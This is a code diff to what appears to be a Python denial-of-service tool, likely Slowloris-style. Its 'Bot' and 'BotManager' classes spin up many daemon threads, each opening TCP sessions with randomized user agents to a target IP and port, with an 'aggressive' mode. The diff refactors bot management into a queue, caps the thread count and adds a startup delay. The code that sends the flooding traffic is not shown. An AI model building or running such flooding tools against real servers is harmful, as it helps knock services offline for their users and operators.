@@ -4,10 +4,11 @@
 
 import socket 
 from time import sleep 
-from lib.const import header
+from queue import Queue 
 from threading import Thread
 from random import randint, choice 
 from string import ascii_lowercase
+from lib.const import header, max_threads
 
 
 class Useragent:
@@ -49,6 +50,7 @@ class Bot:
                 sleep(1)
         
     def start(self):
+        self.sleep()
         while self.is_alive:
             session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             session.settimeout(10)
@@ -95,39 +97,27 @@ class BotManager:
     def __init__(self, ip, port, threads, is_aggressive):
         self.ip = ip 
         self.port = port 
-        self.bots = []
+        self.bots = Queue()
         self.is_alive = True 
-        self.threads = threads
         self.is_aggressive = is_aggressive
-    
-    def create_bots(self):
+        self.threads = threads if threads < max_threads else max_threads
+                
+    def start(self):        
         for _ in range(self.threads):
 
             if not self.is_alive:
                 break 
 
             bot = Bot(self.ip, self.port, self.is_aggressive)
-            self.bots.append(bot)
-    
-    def start_bots(self):
-        for bot in self.bots:
-
-            if not self.is_alive:
-                break
+            self.bots.put(bot)
 
             try:
-                t = Thread(target=bot.start)
-                t.daemon = True
-                t.start()
+                Thread(target=bot.start, daemon=True).start() 
             except:
-                pass 
-        
-    def start(self):
-        self.create_bots()
-        self.start_bots()     
+                break 
     
     def stop(self):
         self.is_alive = False 
 
-        for bot in self.bots:
-            bot.stop()
+        while self.bots.qsize():
+            self.bots.get().stop()
